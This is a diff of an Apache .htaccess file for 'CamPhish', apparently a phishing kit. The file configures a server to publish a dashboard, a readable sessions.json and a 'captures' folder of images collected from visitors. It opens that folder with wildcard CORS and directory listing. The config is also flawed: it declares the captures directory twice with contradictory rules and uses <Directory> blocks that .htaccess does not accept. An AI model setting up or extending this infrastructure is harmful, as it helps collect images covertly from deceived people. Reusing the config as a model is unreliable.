@@ -1,15 +1,116 @@
-# Force PHP to process HTML files
-AddType application/x-httpd-php .html .htm
+# CamPhish .htaccess Configuration
+# Allows proper access to images, JSON files, and other resources
 
-# Enable PHP processing
-php_flag display_errors Off
-php_flag log_errors On
-
-# Default charset
-AddDefaultCharset UTF-8
-
-# Enable following symlinks
+# Enable following symbolic links
 Options +FollowSymLinks
 
-# Disable directory browsing
+# Disable directory browsing for security
 Options -Indexes
+
+# Enable mod_rewrite
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+</IfModule>
+
+# Allow CORS for images and JSON files (important for dashboard)
+<IfModule mod_headers.c>
+    # Allow cross-origin access to images
+    <FilesMatch "\.(png|jpg|jpeg|gif|webp|svg)$">
+        Header set Access-Control-Allow-Origin "*"
+        Header set Access-Control-Allow-Methods "GET, OPTIONS"
+        Header set Access-Control-Allow-Headers "Content-Type"
+    </FilesMatch>
+    
+    # Allow cross-origin access to JSON files
+    <FilesMatch "\.(json)$">
+        Header set Access-Control-Allow-Origin "*"
+        Header set Access-Control-Allow-Methods "GET, OPTIONS"
+        Header set Access-Control-Allow-Headers "Content-Type"
+    </FilesMatch>
+    
+    # Security headers for the dashboard
+    <FilesMatch "dashboard\.html$">
+        Header set X-Content-Type-Options "nosniff"
+        Header set X-Frame-Options "SAMEORIGIN"
+    </FilesMatch>
+</IfModule>
+
+# Set proper MIME types
+<IfModule mod_mime.c>
+    AddType image/png .png
+    AddType image/jpeg .jpg .jpeg
+    AddType image/gif .gif
+    AddType image/webp .webp
+    AddType image/svg+xml .svg
+    AddType application/json .json
+    AddType text/html .html .htm
+    AddType application/x-httpd-php .php
+</IfModule>
+
+# Enable compression for better performance
+<IfModule mod_deflate.c>
+    AddOutputFilterByType DEFLATE text/html text/plain text/css text/javascript application/javascript application/json
+</IfModule>
+
+# Cache control for images (improves dashboard performance)
+<IfModule mod_expires.c>
+    ExpiresActive On
+    
+    # Images - cache for 1 hour (dashboard needs to see new captures)
+    ExpiresByType image/png "access plus 1 hour"
+    ExpiresByType image/jpeg "access plus 1 hour"
+    ExpiresByType image/gif "access plus 1 hour"
+    ExpiresByType image/webp "access plus 1 hour"
+    
+    # JSON files - no cache (need real-time updates)
+    ExpiresByType application/json "access plus 0 seconds"
+    
+    # HTML files - minimal cache
+    ExpiresByType text/html "access plus 5 minutes"
+    
+    # CSS and JavaScript - cache for 1 day
+    ExpiresByType text/css "access plus 1 day"
+    ExpiresByType application/javascript "access plus 1 day"
+</IfModule>
+
+# Prevent access to sensitive files
+<FilesMatch "^(\.htaccess|\.git|config\.json|sessions\.json|.*\.log|.*\.sh|camphish\.sh|cleanup\.sh)$">
+    # Allow dashboard to read sessions.json but deny direct downloads of sensitive files
+    <If "%{REQUEST_URI} =~ /sessions\.json$/">
+        Require all granted
+    </If>
+    <ElseIf "%{REQUEST_URI} =~ /config\.json$/">
+        Require all denied
+    </ElseIf>
+    <Else>
+        Require all denied
+    </Else>
+</FilesMatch>
+
+# PHP error handling - don't display errors to users
+php_flag display_errors Off
+php_flag log_errors On
+php_value error_log error.log
+
+# Security: Prevent PHP execution in uploads/captures directory
+<Directory "captures">
+    php_flag engine off
+    Options -ExecCGI
+    AddHandler cgi-script .php .pl .py .jsp .asp .sh .cgi
+    
+    # Allow image files to be served
+    <FilesMatch "\.(png|jpg|jpeg|gif|webp|svg)$">
+        Require all granted
+    </FilesMatch>
+</Directory>
+
+# Allow access to the captures directory for the dashboard
+<Directory "captures">
+    Options +Indexes
+    Require all granted
+</Directory>
+
+# Performance: Enable keep-alive
+<IfModule mod_headers.c>
+    Header set Connection keep-alive
+</IfModule>
